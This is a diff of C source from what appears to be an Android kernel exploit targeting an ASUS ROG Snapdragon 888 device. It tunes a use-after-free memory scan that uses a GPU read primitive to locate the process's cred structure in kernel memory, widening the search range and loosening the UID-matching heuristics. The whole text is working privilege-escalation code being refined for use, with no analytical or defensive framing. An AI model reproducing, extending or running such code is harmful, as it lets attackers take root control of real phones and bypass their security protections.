@@ -2089,48 +2089,41 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                             }
 
                             if (!c_ptr) {
-                                // Fallback: Scan all pointers - EXPANDED for ROG
-                                // On SD888, cred structure may be larger, search wider range
-                                fprintf(stderr, "      [P] [*] Expanding search for ROG SD888 layout...\n");
+                                // Fallback: Scan all pointers - AGGRESSIVE for ROG SD888
+                                fprintf(stderr, "      [P] [*] AGGRESSIVE scan for ROG SD888 layout (-8000...+5000)...\n");
                                 
-                                for (int off = c_off - 6000; off < c_off + 4000; off += 8) {
+                                for (int off = c_off - 8000; off < c_off + 5000; off += 8) {
                                     if (off < 0 || off > 16384 - 8) continue;
                                     uint64_t p = *(uint64_t *)(big_data + off);
-                                    if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                                    if ((p & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
                                         p_cand++;
-                                        // Try larger read - cred may be up to 512 bytes on some kernels
                                         uint8_t cc[512];
                                         if (gpu_read_task_struct(fd, p, cc, 512) == 0) {
-                                            int uid_count = 0;
-                                            int first_uid_offset = -1;
-                                            // Search full 512 bytes for ROG
-                                            for (int co = 0; co < 504; co += 4) {
-                                                uint32_t val = *(uint32_t *)(cc + co);
-                                                if (val == my_uid) {
-                                                    if (first_uid_offset == -1) first_uid_offset = co;
-                                                    uid_count++;
-                                                    if (uid_count >= 2) { // Stronger match
+                                            uint32_t *uids = (uint32_t *)cc;
+                                            // Check for UID/GID pattern (common in all kernels)
+                                            for (int co = 0; co < 120; co++) { // check first 480 bytes
+                                                if (uids[co] == my_uid) {
+                                                    // Pattern A: Double UID (standard)
+                                                    if (co < 127 && uids[co+1] == my_uid) {
                                                         c_ptr = p;
-                                                        fprintf(stderr, "      [P] [!!!] Parent found MATCH via ROG scan! ptr=0x%lx (UID at +0x%x, +0x%x, count %d)\n", 
-                                                                (unsigned long)c_ptr, first_uid_offset, co, uid_count);
+                                                        fprintf(stderr, "      [P] [!!!] MATCH (Double UID) at ptr=0x%lx off=+0x%x\n", (unsigned long)p, co*4);
+                                                        break;
+                                                    }
+                                                    // Pattern B: UID followed by something that looks like GID
+                                                    if (co < 127 && (uids[co+1] == my_uid || uids[co+1] == 0 || uids[co+1] == 1000)) {
+                                                        c_ptr = p;
+                                                        fprintf(stderr, "      [P] [!!!] MATCH (UID/GID pattern) at ptr=0x%lx off=+0x%x\n", (unsigned long)p, co*4);
                                                         break;
                                                     }
                                                 }
                                             }
-                                            if (c_ptr) break;
-                                            
-                                            // Debug: if we found single UID but not double, print it
-                                            if (uid_count == 1 && first_uid_offset >= 0) {
-                                                fprintf(stderr, "      [P] [?] Single UID match at ptr=0x%lx offset +0x%x (need 2 matches)\n",
-                                                        (unsigned long)p, first_uid_offset);
+                                            if (!c_ptr && p_cand < 5) { // Dump first few candidates if no match
+                                                fprintf(stderr, "      [P] [?] Candidate %d (0x%lx) head: %08x %08x %08x %08x\n", 
+                                                        p_cand, (unsigned long)p, uids[0], uids[1], uids[2], uids[3]);
                                             }
                                         }
                                     }
-                                }
-                                
-                                if (!c_ptr) {
-                                    fprintf(stderr, "      [P] [!] ROG scan complete: checked %d candidates, UID pattern not found.\n", p_cand);
-                                    fprintf(stderr, "      [P] [!] This may indicate non-standard cred layout on this ROG kernel.\n");
+                                    if (c_ptr) break;
                                 }
                             }
                             if (c_ptr) {
